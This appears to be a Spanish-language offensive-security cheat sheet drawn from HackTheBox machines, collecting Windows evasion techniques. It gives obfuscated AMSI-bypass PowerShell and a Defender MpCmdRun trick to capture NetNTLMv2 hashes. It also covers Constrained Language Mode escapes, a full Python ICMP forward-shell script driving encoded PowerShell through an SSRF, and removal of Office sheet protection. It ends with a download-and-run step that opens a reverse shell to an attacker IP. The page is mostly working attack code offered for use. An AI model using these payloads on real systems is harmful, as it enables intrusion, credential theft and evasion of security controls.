# Bypassing

## AMSI

### Automatización de WinRM

```
*Evil-WinRM* PS C:\Users\melanie\Desktop> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!
```

### Corromper tarea (Condición de carrera)

```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

```
PS C:\Users\Sierra.Frye\Documents>

$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```

## Obtención de hash NetNTLMv2 con Windows Defender

```
*Evil-WinRM* PS C:\Program Files\Windows Defender> ./MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.16.6\test
```

## CLM

### Detección

```
[10.10.10.210]: PS> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

### PSSessions

```
PS /home/rubbx/Desktop/HTB/Machines/Reel2> Enter-PSSession -ComputerName 10.10.10.210 -Credential $Cred -Authentication Negotiate
```

### Ejecución de comandos con funciones

```
[10.10.10.210]: PS> function bypassCLM { whoami }
[10.10.10.210]: PS>bypassCLM
htb\k.svensson
```

## ICMP Forward Shell

```python
#!/usr/bin/env python3import base64import requestsimport threadingfrom cmd import Cmdfrom scapy.all import *from urllib.parse import quoteclass Term(Cmd):    prompt = "[~] - "    cmd_payload = """$cmd = '{cmd}'; $step=1000; $ping = New-Object System.Net.NetworkInformation.Ping; $opts = New-Object System.Net.NetworkInformation.PingOptions; $opts.DontFragment = $true; $res=(iex -command $cmd|out-string); $data = [System.Text.Encoding]::ASCII.GetBytes($res); $i=0; while($i -lt $data.length)"""    def __init__(self):        super().__init__()        thread = threading.Thread(target=self.listen_thread, args=())        thread.daemon = True        thread.start()    def listen_thread(self):        sniff(filter="icmp and src 10.10.10.57", iface="tun0", prn=self.handle_icmp)    def handle_icmp(self, pkt):        print(pkt[Raw].load.decode(), end="")        sys.stdout.flush()    def default(self, args):        cmd = self.cmd_payload.format(cmd=args)        enccmd = quote(quote(base64.b64encode(cmd.encode('utf-16le')).decode()))        requests.get(f'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=powershell+-enc+{enccmd}')term = Term()try:    term.cmdloop()except KeyboardInterrupt:    print()
```

## Python

Es posible eliminar la ruta que se obtiene de la ruta actual con `getcwd()` pasándole como argumento un path pero con una barra al principio

```
python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.path.join(os.getcwd(), "public", "uploads", "test")
'/home/rubbx/Desktop/HTB/Machines/OpenSource/source/app/app/public/uploads/test'
```

En este ejemplo con la cadena `/test`

```
>>> os.path.join(os.getcwd(), "public", "uploads", "/test")
'/test'
```

### Cifrado documentos Office

Al descomprimir el documento, se puede eliminar el hash que contiene a la contraseña

```
unzip Desktop_Phishing_Attempt.xlsx
```

```
<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg=="
```

```
zip -r Desktop_Phishing_Attempt.xlsx *
```

## CLM Evasion

```jsx
$ExecutionContext.SessionState.LanguageMode
iwr -uri http://10.10.14.13/PsBypassCLM.exe -o C:\Temp\PsBypassCLM.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.13 /rport=443 /U C:\Temp\PsBypassCLM.exe
```